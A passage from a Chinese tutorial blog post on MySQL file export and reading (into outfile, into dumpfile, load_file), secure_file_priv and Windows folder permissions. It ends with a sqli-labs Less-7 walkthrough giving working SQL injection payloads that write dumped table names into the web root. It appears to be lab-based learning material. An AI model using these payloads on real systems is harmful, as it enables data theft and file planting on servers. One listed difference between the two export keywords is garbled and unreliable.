<p><img src="https://images2.imgbox.com/6e/65/qIWcs7ZR_o.png" alt="文件 return_2.txt"></p> 
<h6><a id="into_dumpfile__into_outfile__407"></a>into dumpfile 与 into outfile 的区别</h6> 
<ol><li>into dumpfile 可以导出多行记录，而 into outfile 可以导出多行记录。</li><li>into dumpfile 无法通过使用参数来更改导出数据的格式，而 into outfile 可通过设置一些参数来（如使用参数 <strong>LINES TERMINATED BY ‘\n’</strong> 来使记录在导出到指定文件后在每一行记录末尾添加一个换行符 ）定制导出数据的格式。</li><li>into dumpfile 导出的数据是连在一起的，而 into outfile 导出的文件具有更好的默认格式，便于观察。</li><li>在导出数据中含有转义字符时，两者导出的内容会存在一些差异。</li></ol> 
<p>前三点区别我们在前面（本篇文章）已经见到过了，第四点我们可以通过下面的例子来直观的感受下。</p> 
<p>首先，构造 SQL 语句如下：</p> 
<pre><code class="prism language-sql"><span class="token keyword">select</span> <span class="token string">'a\nab\nabc'</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'C:\\ProgramData\\MySQL\\MySQL Server 5.7\\Uploads\\return_3.txt'</span><span class="token punctuation">;</span>
</code></pre> 
<p>导出数据在 <strong>return_3.txt</strong> 文件中的显示结果为：</p> 
<p><img src="https://images2.imgbox.com/96/f7/FXTwC5Fq_o.png" alt="return_3.txt 文件"></p> 
<pre><code class="prism language-sql"><span class="token keyword">select</span> <span class="token string">'a\nab\nabc'</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">'C:\\ProgramData\\MySQL\\MySQL Server 5.7\\Uploads\\return_4.txt'</span><span class="token punctuation">;</span>
</code></pre> 
<p>导出数据在 <strong>return_4.txt</strong> 文件中的显示结果为：</p> 
<p><img src="https://images2.imgbox.com/8e/3d/eBRCJ1os_o.png" alt="return_4.txt 文件"></p> 
<h4><a id="load_file_434"></a>load_file()</h4> 
<p>使用 load_file() 函数可读取指定文件中的内容。可以通过构造 SQL 语句来获取我们刚刚导出的文件 <strong>return_4.txt</strong> 中的内容。</p> 
<pre><code class="prism language-sql"><span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'C:\\ProgramData\\MySQL\\MySQL Server 5.7\\Uploads\\return_4.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/b4/9d/YaavPcyj_o.png" alt="返回结果"><br> 可以看到 load_file() 函数正确读取了指定文件中的内容。</p> 
<h4><a id="_444"></a>注</h4> 
<p>无论是使用关键字 into dumpfile、into outfile 还是函数 load_file() 来对文件执行某些操作，都必须在 secure_file_priv 参数指定的路径之下进行。</p> 
<ol><li>如果使用关键字 into dumpfile 或 into outfile 在不正确的路径（不在 secure_file_priv 指定的路径范围内）下导出数据到某个文件，你将得到错误信息 <strong>ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</strong> 并且该导出操作不会被正常执行。</li><li>如果使用函数 load_file() 读取的文件不在正确的路径（不在 secure_file_priv 指定的路径范围内）中，则无论该文件中的内容是什么，读取到的结果都将为 <strong>null</strong>。</li></ol> 
<h4><a id="_secure_file_priv_449"></a>修改 secure_file_priv</h4> 
<p>由于参数 secure_file_priv 不能被动态修改，所以我们只能在 MySQL 的配置文件中手动修改，修改完成后需要重启 MySQL 服务以使修改能够生效。</p> 
<h6><a id="_myini_452"></a>配置文件 my.ini</h6> 
<p>在操作系统为 <strong>Windows</strong>，MySQL 版本为 <strong>5.7.40</strong> 时，MySQL 的默认配置文件为 <strong>my.ini</strong>，默认存放路径为 <strong>C:\ProgramData\MySQL\MySQL Server 5.7</strong>。</p> 
<p><em><strong>注：</strong></em><br> 对于不同的操作系统 MySQL 的默认配置文件的名称及存放位置可能会存在不同，即使是同一操作系统下的不同 MySQL 版本，其默认配置文件也可能存在不同。</p> 
<p>在打开该配置文件后，将<br> <strong>secure-file-priv="C:/ProgramData/MySQL/MySQL Server 5.7/Uploads"</strong><br> 修改为：<br> <strong>secure-file-priv=</strong></p> 
<p>重启服务（是重启 MySQL 服务而不是重新登录 MySQL）后，使用如下命令来判断 secure_file_priv 的参数值是否被更改。<br> <img src="https://images2.imgbox.com/02/a6/YDdY2jwi_o.png" alt="更改成功"></p> 
<h6><a id="_466"></a>权限问题</h6> 
<p>尝试使用如下 SQL 语句将数据导出到网站根目录：</p> 
<pre><code class="prism language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'C:\\Users\\36683\\TwoMoons\\WWW\\result.txt'</span><span class="token punctuation">;</span>
</code></pre> 
<p>MySQL 抛出错误<br> <strong>ERROR 1 (HY000): Can’t create/write to file ‘C:\Users\36683\TwoMoons\WWW\result.txt’ (Errcode: 13 - Permission denied)</strong><br> 意在提醒我们对该路径没有读写权限。</p> 
<h6><a id="_477"></a>修改文件夹权限</h6> 
<h6><a id="_478"></a>问题总结</h6> 
<p>在遇到读写权限问题后，尝试向搜索引擎寻求帮助，但解决方案大多针对 Linux 操作系统且并不详细，只好自己摸索了。</p> 
<p><em><strong>在解决问题之前，先让我们总结一下遇到了哪些问题：</strong></em></p> 
<ol><li>Windows 操作系统下如何更改文件（夹）权限。</li><li>如何更改权限以使得我们能通过 MySQL 读取或导出文件。</li></ol> 
<p>对于如何在 Windows 操作系统更改文件（夹）权限，我们可以通过搜索引擎寻求帮助。但是这第二个问题只能靠自己摸索了。</p> 
<p><strong>不知道各位是否清楚这么一个事实：</strong><br> MySQL 目录下的 Uploads 文件夹默认就拥有读写权限。</p> 
<p>那么文件权限的更改是否可以依葫芦画瓢摸索出来呢，让我们拭目以待。</p> 
<h6><a id="_492"></a>求索（追求和探索）</h6> 
<p>首先找到 Uploads 文件夹，右键该文件夹后点击 <strong>属性</strong>。<br> <img src="https://images2.imgbox.com/62/43/r3hkDZWd_o.png" alt="点击属性"></p> 
<p>点击 <strong>安全</strong>。</p> 
<p><img src="https://images2.imgbox.com/29/e1/sjzVVGzT_o.png" alt="安全"></p> 
<p>在找到网站根目录（或是其它你想要导出或读取的路径），以同样的方式进入 <strong>安全</strong> 页面。</p> 
<p><img src="https://images2.imgbox.com/7e/f4/jbojuEaG_o.png" alt="网站根目录文件夹的安全页面"></p> 
<p>可以发现两个文件夹在权限的分配下确实有不同。</p> 
<p>经查验，在 <strong>Uploads</strong> 文件夹中存在如下 <strong>组和用户名</strong> 是 <strong>Uploads</strong> 文件夹独有的：</p> 
<ol><li>CREATOR OWNER</li><li>NETWORK SERVICE</li><li>USERS (TWO-MOONS\Users)</li></ol> 
<p>经检查，在 <strong>Uploads</strong> 文件夹中存在如下 <strong>组和用户名</strong> 是拥有读写权限且为 <strong>Uploads</strong> 文件夹独有的：</p> 
<ol><li>CREATOR OWNER</li><li>USERS (TWO-MOONS\Users)</li></ol> 
<p>于是我们排除了影响因素是 <strong>NETWORK SERVICE</strong> 的可能。</p> 
<p>我们将 CREATOR OWNER 及 USERS (TWO-MOONS\Users) 完整复制到网站根目录（或是其它你想要导出或读取的路径）中。</p> 
<h6><a id="_520"></a>复制权限设置</h6> 
<p>进入如下界面后，点击 <strong>编辑</strong>。<br> <img src="https://images2.imgbox.com/d4/c2/2ECBzwhm_o.png" alt="点击编辑"></p> 
<p>点击 <strong>添加</strong>。</p> 
<p><img src="https://images2.imgbox.com/a2/9e/1tX2iq9q_o.png" alt="点击添加"></p> 
<p>添加用户或组 <strong>CREATOR OWNER</strong>。<br> <img src="https://images2.imgbox.com/dc/f9/tAf6Dnot_o.png" alt="添加用户或组"></p> 
<p>更改权限使其与文件夹 <strong>Uploads</strong> 中的用户或组 <strong>CREATOR OWNER</strong> 的权限类似 <strong>（重点是要勾选读取与执行权限）</strong>。</p> 
<p><img src="https://images2.imgbox.com/af/3b/DUV7XsVx_o.png" alt="复制权限设置"><br> 请你根据上述步骤添加 用户或组 <strong>Users</strong> 并修改其权限。</p> 
<p><strong>注：</strong><br> 在添加 用户或组 时，对象名称应该为 <strong>Users</strong> 而不是 <strong>USERS (TWO-MOONS\Users)</strong> 括号中的内容因计算机的不同会存在差异，只需填入 <strong>Users</strong> 即可，括号中的内容系统会自动为你添加。<br> <img src="https://images2.imgbox.com/61/86/BxSYixkC_o.png" alt="一个小提示"></p> 
<p>将文件夹 WWW 的 Users 权限修改为如下。</p> 
<p><img src="https://images2.imgbox.com/22/7a/Yznv9NTC_o.png" alt="最终权限"></p> 
<p>与文件夹 Uploads 中的 Users 权限不同的是：</p> 
<ol><li>由于我们需要对该文件夹具有读取及写入的权限，所以与 Uploads 的 Users 权限比较，这里多勾选了写入权限。</li><li>由于特殊权限比较特殊（结论由该权限名称推测而出）还有就是这个选项不知道该这么进行勾选，为谨慎起见，我们先不勾选，如果使用 MySQL 再遇到权限问题我们再返回想想办法也不迟。</li></ol> 
<p>在添加 组或用户 及 成功修改权限 后，点击 <strong>应用</strong> 以使修改生效。</p> 
<p><img src="https://images2.imgbox.com/21/e9/ASatyYHq_o.png" alt="点击应用使修改生效"></p> 
<h6><a id="_553"></a>验证可行性</h6> 
<p>再次执行如下 SQL 语句：</p> 
<pre><code class="prism language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'C:\\Users\\36683\\TwoMoons\\WWW\\users.txt'</span><span class="token punctuation">;</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/9a/64/mcr7hAAT_o.png" alt="user.txt"><br> 可以看到，我们成功使用 MySQL 导出数据到 WWW 文件夹中。</p> 
<h6><a id="_Users_564"></a>组或用户名 Users</h6> 
<blockquote> 
 <p>Users是Windows中预设的一个用户组，目的是：防止用户进行有意或无意的系统范围的更改，但是可以运行大部分应用程序。这个用户组包含了所有可登录的用户（Windows Vista开始，管理员用户和高级用户都也是默认被包含此组内）。这个组的权限是受限的，但要大于Guests组。</p> 
 <hr> 
 <p><em><strong>上述内容引用自 百度百科</strong></em></p> 
</blockquote> 
<p>查阅资料后发现，Users 为 Windows 操作系统下的普通用户组，在对这个组添加 读写权限 后，MySQL 便可以在该文件夹中读取或写入文件。</p> 
<h6><a id="_571"></a>结论</h6> 
<ol><li>通过删减 组或用户名 来达到仅保留 组或用户名 <strong>CREATOR OWNER</strong> 及 <strong>Users</strong> 中的一个，可以发现在前面对 MySQL 的读写权限起作用的应该是 <strong>Users</strong>。也就是说，仅需要添加 <strong>Users</strong> 并修改其权限即可解决 <strong>ERROR 1 (HY000): Can’t create/write to file ‘C:\Users\36683\TwoMoons\WWW\result.txt’ (Errcode: 13 - Permission denied)</strong> 问题。</li><li>经实验，函数 load_file() 读取的文件若位于没有读取权限的文件夹中，无论该文件中是否含有内容读取的结果都将为 <strong>null</strong>。</li><li>MySQL 中的关键字 <strong>into dumpfile</strong>、<strong>into outfile</strong> 及函数 <strong>load_file()</strong> 若想在某个文件夹中发挥作用，这个文件夹必须在参数 <strong>secure_file_priv</strong> 的范围内并且 MySQL 对该文件夹具有读写权限。</li></ol> 
<h4><a id="_576"></a>尝试进行数据导出</h4> 
<pre><code class="prism language-sql">?id<span class="token operator">=</span><span class="token string">'))  union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile '</span><span class="token punctuation">.</span>\\target<span class="token punctuation">.</span>txt'<span class="token comment">--+</span>
</code></pre> 
<p>这里我们使用相对路径注入到当前文件夹下，但你以为当前文件夹是该网站当前页面位于的文件夹吗？<br> 你错了。在 Windows 操作系统的 MySQL 5.7.40 下，路径 <strong>.\\</strong> 实际指向的文件夹是<br> <strong>C:\ProgramData\MySQL\MySQL Server 5.7\Data</strong>。<br> 在使用上述构造的语句后，你并不会在 <strong>C:\Users\36683\TwoMoons\WWW\range\sqli-labs\Less-7</strong> 文件夹中看到 <strong>target.txt</strong> 文件，但你可以在<br> <strong>C:\ProgramData\MySQL\MySQL Server 5.7\Data</strong> 观察到该文件。</p> 
<p>让我们构造一个语句让爆破 security 数据库中的表名并将其导出到网站根目录 WWW 下。</p> 
<pre><code class="prism language-sql">?id<span class="token operator">=</span><span class="token string">')) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile '</span>C:\\Users\\<span class="token number">36683</span>\\TwoMoons\\WWW\\target<span class="token punctuation">.</span>txt'<span class="token comment">--+</span>
</code></pre> 
<p>可以看到我们已正常爆破 security 数据库中的表名并将其导出到网站根目录 WWW 下。</p> 
<p><img src="https://images2.imgbox.com/82/68/5A2ubq5z_o.png" alt="导出文件"></p> 
<p>通过该种方式还可以爆破出其他信息，请继续探索吧。</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/ebb21847c7ea481c8e231bd3faa49238/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">机器学习-11.神经网络</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/36d55934da4880366255e4628ef78e6f/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">C#文件操作集合四（文件复制和移动）</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>